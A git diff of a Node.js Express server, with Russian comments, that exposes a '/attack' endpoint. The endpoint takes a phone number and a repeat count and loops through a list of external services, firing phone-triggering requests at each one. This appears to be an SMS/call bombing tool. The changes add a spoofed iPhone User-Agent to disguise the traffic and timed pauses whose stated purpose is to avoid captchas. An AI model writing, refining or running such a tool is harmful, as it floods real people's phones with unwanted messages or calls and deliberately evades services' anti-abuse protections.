@@ -1,36 +1,46 @@
 const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
-const services = require('./services.js'); // Проверь, что этот файл есть в GitHub!
+const services = require('./services');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
 app.post('/attack', async (req, res) => {
-    // ВАЖНО: берем phone и repeats из запроса
-    const { phone, repeats } = req.body; 
-    console.log(`🚀 Запуск на номер: ${phone}, повторов: ${repeats}`);
+    const { phone, repeats } = req.body;
+    const count = parseInt(repeats) || 1;
 
+    console.log(`🚀 СТАРТ: ${phone} | Кругов: ${count}`);
     res.status(200).json({ status: "started" });
 
-    // Цикл теперь увидит переменную repeats
-    for (let i = 0; i < (repeats || 1); i++) {
+    for (let i = 0; i < count; i++) {
+        console.log(`--- Круг ${i + 1} ---`);
         for (const service of services) {
             try {
-                const data = typeof service.data === 'function' ? service.data(phone) : service.data;
+                const payload = typeof service.data === 'function' ? service.data(phone) : service.data;
+                
                 await axios({
                     method: service.method,
                     url: service.url,
-                    headers: service.headers,
-                    data: data,
-                    timeout: 4000
+                    headers: {
+                        ...service.headers,
+                        // Маскируемся под мобильное устройство
+                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+                        "Accept": "*/*"
+                    },
+                    data: payload,
+                    timeout: 5000
                 });
+                console.log(`✅ ${service.name}: OK`);
             } catch (e) {
-                // Игнорируем ошибки отдельных сервисов
+                console.log(`❌ ${service.name}: Пропуск`);
             }
+            // Маленькая пауза между сервисами, чтобы не ловить капчу
+            await new Promise(r => setTimeout(r, 400));
         }
-        await new Promise(r => setTimeout(r, 1500));
+        // Пауза между кругами
+        await new Promise(r => setTimeout(r, 2000));
     }
 });
 
